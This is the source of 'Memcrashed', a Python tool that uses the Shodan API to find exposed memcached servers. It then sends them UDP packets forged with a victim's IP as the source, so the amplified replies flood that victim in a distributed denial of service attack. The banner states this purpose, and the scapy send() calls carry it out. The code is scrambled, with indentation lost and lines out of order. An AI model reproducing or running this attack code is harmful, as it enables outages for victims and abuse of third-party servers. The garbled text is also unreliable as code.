import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout
starttime = time.time()
@contextmanager...
yield
HEADER = '\x1b[0m'
keys = Path('./api.txt')
logo = color.HEADER + """

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                        Author: @037
                                        Version: 3.2

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                      
"""
print(logo)
if keys.is_file():
SHODAN_API_KEY = file.readline().rstrip('\n')
file = open('api.txt', 'w')
while True:
SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
api = shodan.Shodan(SHODAN_API_KEY)
file.write(SHODAN_API_KEY)
print('')
print('[~] File written: ./api.txt')
myresults = Path('./bots.txt')
print('[✘] Error: %s' % e)
file.close()
query = input(
    '[*] Use Shodan API to search for affected Memcached servers? <Y/n>: '
    ).lower()
option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
if query.startswith('y'):
if option.startswith('y'):
print('')
saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: '
    ).lower()
file = open('api.txt', 'w')
print('')
print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
if myresults.is_file():
SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
print('[•] Exiting Platform. Have a wonderful day.')
results = api.search('product:"Memcached" port:11211')
if saveme.startswith('y'):
print('')
file.write(SHODAN_API_KEY)
print('[✓] API Key Authentication: SUCCESS')
ip_array = [line.rstrip() for line in my_file]
if saveme.startswith('y') or query.startswith('y'):
print('[✘] Error: No bots stored locally, bots.txt file not found!')
print('[~] File written: ./api.txt')
print('[~] Number of bots: %s' % results['total'])
print('')
print('')
print('')
file.close()
print('')
target = input('[▸] Enter target IP address: ')
print('[✘] Error: No bots stored locally or remotely on Shodan!')
print('[~] Restarting Platform! Please wait.')
saveresult = input('[*] Save results for later usage? <Y/n>: ').lower()
power = int(input('[▸] Enter preferred power (Default 1): ') or '1')
print('[~] Restarting Platform! Please wait.')
print('')
if saveresult.startswith('y'):
data = input('[▸] Enter payload contained inside packet: '
    ) or '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
print('')
file2 = open('bots.txt', 'a')
print('')
for result in results['matches']:
if query.startswith('y'):
file2.write(result['ip_str'] + '\n')
print('[~] File written: ./bots.txt')
iplist = input(
    '[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
if saveme.startswith('y'):
print('')
if iplist.startswith('y'):
iplistlocal = input(
    '[*] Would you like to display all the bots stored locally? <Y/n>: '
    ).lower()
print('')
file2.close()
print('')
if iplistlocal.startswith('y'):
engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
counter = int(0)
print('')
if engage.startswith('y'):
for result in results['matches']:
counter = int(0)
if saveme.startswith('y'):
print('')
host = api.host('%s' % result['ip_str'])
for x in ip_array:
for i in ip_array:
for result in results['matches']:
print('[✘] Error: %s not engaged!' % target)
counter = counter + 1
host = api.host('%s' % x)
if power > 1:
print('')
if power > 1:
print('[~] Restarting Platform! Please wait.')
print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter,
    result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
counter = counter + 1
print('[+] Sending %d forged UDP packets to: %s' % (power, i))
if power == 1:
print('[•] Task complete! Exiting Platform. Have a wonderful day.')
print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
if power == 1:
print('')
time.sleep(1.1 - (time.time() - starttime) % 1.1)
print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter,
    x, host.get('os', 'n/a'), host.get('org', 'n/a')))
send(IP(src=target, dst='%s' % i) / UDP(dport=11211) / Raw(load=data),
    count=power)
print('[+] Sending 1 forged UDP packet to: %s' % i)
send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211) / Raw(
    load=data), count=power)
print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
time.sleep(1.1 - (time.time() - starttime) % 1.1)
send(IP(src=target, dst='%s' % i) / UDP(dport=11211) / Raw(load=data),
    count=power)
send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211) / Raw(
    load=data), count=power)
